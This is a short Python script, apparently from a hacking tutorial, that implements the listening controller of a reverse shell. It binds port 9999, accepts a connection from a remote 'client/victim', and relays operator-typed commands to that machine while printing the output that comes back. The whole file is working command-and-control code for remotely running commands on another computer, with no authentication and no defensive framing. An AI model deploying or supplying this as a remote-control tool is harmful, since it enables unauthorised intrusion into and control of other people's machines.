import socket
import sys

# Create a socket (connect to computers)
def create_socket():
    try: 
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
   try: 
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        
        s.bind((host, port))
        s.listen(5)
    
   except socket.error as msg:
       print("Socket Binding Error" + str(msg) + "\nRetrying...")
       bind_socket()
       
# Establish connection with client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()
    
# Send commands to client/victim or a friend
def send_commands(conn):
    # for running multiple commands on client computer
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        # something is typed from server
        if len(str.encode(cmd)) > 0:
            # command sent to client in form of bytes
            conn.send(str.encode(cmd))
            # receiving bytes from client in chunks and converting them to string
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
main()